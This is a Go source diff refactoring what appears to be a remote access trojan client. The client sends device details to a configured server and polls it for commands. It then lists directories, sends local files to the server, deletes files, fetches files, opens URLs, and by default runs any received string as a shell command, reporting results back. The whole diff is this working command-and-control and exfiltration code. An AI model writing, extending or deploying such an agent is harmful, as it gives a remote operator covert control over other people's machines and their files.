@@ -21,38 +21,39 @@ type Handler struct {
 	MacAddress    string
 	Connected     bool
 	DoingRequest  bool
+	CommandUrl    string
 }
 
-func NewHandler(config *environment.Configuration, gateway gateway.Gateway, services *services.Services) *Handler {
-	specs, err := services.Information.LoadDeviceSpecs()
-	if err != nil {
-		panic(err)
-	}
+func NewHandler(
+	configuration *environment.Configuration,
+	gateway gateway.Gateway,
+	services *services.Services,
+	macAddress string,
+) *Handler {
 	return &Handler{
-		Configuration: config,
+		Configuration: configuration,
 		Gateway:       gateway,
 		Services:      services,
-		MacAddress:    specs.MacAddress,
+		MacAddress:    macAddress,
+		CommandUrl:    fmt.Sprint(configuration.Server.URL, configuration.Server.Command),
 	}
 }
 
-func (h *Handler) ConnectWithServer() {
-	sleepTime := 2 * time.Minute
+func (h *Handler) HandleServer() {
+	sleepTime := 5 * time.Second
 	for {
-		go func() {
-			if h.ServerIsAvailable() {
-				if err := h.SendDeviceSpecs(); err != nil {
-					sleepTime = 20 * time.Second
-					h.Connected = false
-					return
-				}
-				sleepTime = 2 * time.Minute
-				h.Connected = true
+		if h.ServerIsAvailable() {
+			if err := h.SendDeviceSpecs(); err != nil {
+				sleepTime = 20 * time.Second
+				h.Connected = false
 				return
 			}
-			sleepTime = 5 * time.Second
-			h.Connected = false
-		}()
+			sleepTime = 2 * time.Minute
+			h.Connected = true
+			return
+		}
+		sleepTime = 5 * time.Second
+		h.Connected = false
 		time.Sleep(sleepTime)
 	}
 }
@@ -67,11 +68,11 @@ func (h *Handler) ServerIsAvailable() bool {
 }
 
 func (h *Handler) SendDeviceSpecs() error {
-	specs, err := h.Services.Information.LoadDeviceSpecs()
+	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
 	if err != nil {
 		return err
 	}
-	body, err := json.Marshal(specs)
+	body, err := json.Marshal(deviceSpecs)
 	if err != nil {
 		return err
 	}
@@ -81,48 +82,32 @@ func (h *Handler) SendDeviceSpecs() error {
 		return err
 	}
 	if res.StatusCode != http.StatusOK {
-		return err
+		return fmt.Errorf("error with status code %d", res.StatusCode)
 	}
 	return nil
 }
 
-func (h *Handler) RequestDone() {
-	h.DoingRequest = false
-}
-
-func (h *Handler) HandleServerRequest() {
-	commandURL := fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Command)
-
+func (h *Handler) HandleCommand() {
 	for {
 		time.Sleep(2 * time.Second)
 		if h.DoingRequest || !h.Connected {
 			continue
 		}
 
-		go func() {
-			defer h.RequestDone()
+		func() {
+			defer func() { h.DoingRequest = false }()
 			h.DoingRequest = true
 
-			res, err := h.Gateway.NewRequest(http.MethodGet,
-				fmt.Sprint(commandURL, "?address=", encode.Base64Encode(h.MacAddress)), nil)
-			if err != nil {
-				return
-			}
-			if res.StatusCode == http.StatusNoContent {
-				return
-			}
-
-			var payload entities.Payload
-			if err := json.Unmarshal(res.ResponseBody, &payload); err != nil {
-				return
-			}
-			if len(strings.TrimSpace(payload.Request)) == 0 {
+			requestCommand, err := h.ReceiveCommand()
+			if len(strings.TrimSpace(requestCommand.Request)) == 0 {
 				return
 			}
 
 			var response []byte
 			var hasErr bool
-			switch strings.ToLower(strings.TrimSpace(payload.Request)) {
+
+			commandParts := strings.Split(requestCommand.Request, " ")
+			switch strings.ToLower(strings.TrimSpace(commandParts[0])) {
 			case "getos":
 				deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
 				if err != nil {
@@ -165,80 +150,59 @@ func (h *Handler) HandleServerRequest() {
 					response = encode.StringToByte(err.Error())
 				}
 				break
+			case "explore":
+				fileExplorer, err := h.Services.Explorer.ExploreDirectory(commandParts[1])
+				if err != nil {
+					response = encode.StringToByte(err.Error())
+					hasErr = true
+					break
+				}
+				explorerBytes, _ := json.Marshal(fileExplorer)
+				response = explorerBytes
+				break
+			case "download":
+				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "download", ""))
+				res, err := h.Services.Upload.UploadFile(filepath)
+				if err != nil {
+					response = encode.StringToByte(err.Error())
+					hasErr = true
+					break
+				}
+				response = res
+				break
+			case "delete":
+				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "delete", ""))
+				err := h.Services.Delete.DeleteFile(filepath)
+				if err != nil {
+					response = encode.StringToByte(err.Error())
+					hasErr = true
+					break
+				}
+				break
+			case "upload":
+				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "upload", ""))
+				res, err := h.Services.Download.DownloadFile(filepath)
+				if err != nil {
+					response = encode.StringToByte(err.Error())
+					hasErr = true
+					break
+				}
+				response = res
+				break
+			case "open-url":
+				err := h.Services.URL.OpenURL(commandParts[1])
+				if err != nil {
+					response = encode.StringToByte(err.Error())
+					hasErr = true
+					break
+				}
+				break
 			default:
-				//FILE EXPLORER
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer) &&
-					strings.TrimSpace(payload.Request[:len(h.Configuration.CommandHandler.CommandFileExplorer)]) == h.Configuration.CommandHandler.CommandFileExplorer {
-					fileExplorer, err := h.Services.Explorer.ExploreDirectory(strings.TrimSpace(strings.ReplaceAll(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer, "")))
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					explorerBytes, _ := json.Marshal(fileExplorer)
-					response = explorerBytes
-					break
-				}
-
-				//DOWNLOAD FILE
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandDownload) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandDownload)] == h.Configuration.CommandHandler.CommandDownload {
-					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandDownload))
-					res, err := h.Services.Upload.UploadFile(filePath, fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Upload), "file")
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					response = res
-					break
-				}
-
-				//DELETE FILE
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandDelete) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandDelete)] == h.Configuration.CommandHandler.CommandDelete {
-					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandDelete))
-					err := h.Services.Delete.DeleteFile(filePath)
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					break
-				}
-
-				//UPLOAD FILE
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandUpload) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandUpload)] == h.Configuration.CommandHandler.CommandUpload {
-					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandUpload))
-					res, err := h.Services.Download.DownloadFile(filePath)
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					response = res
-					break
-				}
-
-				//OPEN URL
-				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandOpenURL) &&
-					payload.Request[:len(h.Configuration.CommandHandler.CommandOpenURL)] == h.Configuration.CommandHandler.CommandOpenURL {
-					url := strings.TrimSpace(strings.TrimPrefix(payload.Request, h.Configuration.CommandHandler.CommandOpenURL))
-					err := h.Services.URL.OpenURL(url)
-					if err != nil {
-						response = encode.StringToByte(err.Error())
-						hasErr = true
-						break
-					}
-					break
-				}
-
-				//SHELL
-				response = encode.StringToByte(h.Services.Terminal.Run(payload.Request, h.Configuration.Connection.ContextDeadline))
+				response = encode.StringToByte(
+					h.Services.Terminal.Run(requestCommand.Request, h.Configuration.Connection.ContextDeadline))
 			}
 
-			requestBody, err := json.Marshal(entities.Payload{
+			body, err := json.Marshal(entities.Payload{
 				MacAddress: h.MacAddress,
 				Response:   response,
 				HasError:   hasErr,
@@ -247,10 +211,26 @@ func (h *Handler) HandleServerRequest() {
 				return
 			}
 
-			res, err = h.Gateway.NewRequest(http.MethodPut, commandURL, requestBody)
-			if err != nil || res.StatusCode != http.StatusOK {
+			responseCommand, err := h.Gateway.NewRequest(http.MethodPut, h.CommandUrl, body)
+			if err != nil || responseCommand.StatusCode != http.StatusOK {
 				log.Println(err)
 			}
 		}()
 	}
+}
+
+func (h *Handler) ReceiveCommand() (entities.Payload, error) {
+	url := fmt.Sprint(h.CommandUrl, "?address=", encode.Base64Encode(h.MacAddress))
+	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
+	if err != nil {
+		return entities.Payload{}, err
+	}
+	if res.StatusCode == http.StatusNoContent {
+		return entities.Payload{}, err
+	}
+	var payload entities.Payload
+	if err := json.Unmarshal(res.ResponseBody, &payload); err != nil {
+		return entities.Payload{}, err
+	}
+	return payload, err
 }
